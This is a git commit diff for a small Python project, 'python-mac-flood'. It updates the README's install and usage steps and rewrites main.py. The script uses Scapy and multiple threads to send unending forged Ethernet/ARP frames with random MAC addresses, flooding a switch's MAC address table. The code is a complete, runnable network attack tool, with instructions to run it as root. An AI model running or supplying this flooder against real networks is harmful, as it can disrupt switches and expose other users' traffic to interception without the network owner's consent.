cc0540db322d84982e347053780af5feb7ab304d
K1llf0rce <fteppan@protonmail.com>
2022-02-21 00:22:11 +0100

    overhaul code and implement argparse properly

--- README.md
+++ README.md
@@ -1,11 +1,13 @@
 # python-mac-flood
 Simple python script for flooding a switch mac address table
-
-# Usage:
-
+## Preperation/Installation
 ```
-# Scapy needs root to run so don't forget to run as root!
-sudo ./env/bin/python ./main.py -t [threads]
-# Example
-sudo ./env/bin/python ./main.py -t 24
+git clone https://github.com/K1llf0rce/python-mac-flood.git
+cd python-mac-flood
+chmod +x main.py
+```
+## Usage:
+```
+# Run as root!
+sudo ./main.py [-h] -t THREADS
 ```
--- main.py
+++ main.py
@@ -1,44 +1,38 @@
+#!./env/bin/python3
+
 from scapy.all import *
 from time import sleep
 import random
 import threading
 import argparse
 
-threads = 4
-answ = False
-count = 0
+# init option parser
+parser = argparse.ArgumentParser(description='Simple MAC-Flooder using Scapy')
+parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
+args = parser.parse_args()
 
-def perform_query():
+# send packet
+def send_packet():
+    count = 0
     while True:
-        global count
         sendp(Ether(src=RandMAC(),dst=getRandomMAC())/ARP(op=2, psrc="0.0.0.0", hwdst=getRandomMAC())/Padding(load="X"*18), verbose=0)
         count = count + 1
         print(f"Sent packet: {count}")
 
+# generate random MAC
 def getRandomMAC():
     genMAC = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
     return genMAC
 
-def flood(): 
-    perform_query()
-
+# start threads
 def startThreads():
+    threads = int(args.threads)
+    print(f"Using thread count of: {threads}")
     for i in range(1,threads):
-        t = threading.Thread(target=flood)
+        t = threading.Thread(target=send_packet)
         t.start()
 
+# start here
 print("RUN AS ROOT!")
 sleep(1)
-
-parser = argparse.ArgumentParser(prog="main.py", usage='%(prog)s [options]',description='Simple MAC-Flooder using Scapy')
-parser.add_argument('-t', metavar='N', type=int, nargs='+', help='threads to use')
-args = parser.parse_args()
-
-if args.t == None:
-    print("No arguments specified!")
-    print('Hint: use "-h" to get help')
-else:
-    threads = int(args.t[0])
-    print(f"Using thread count of: {threads}")
-    sleep(1)
-    startThreads()
+startThreads()
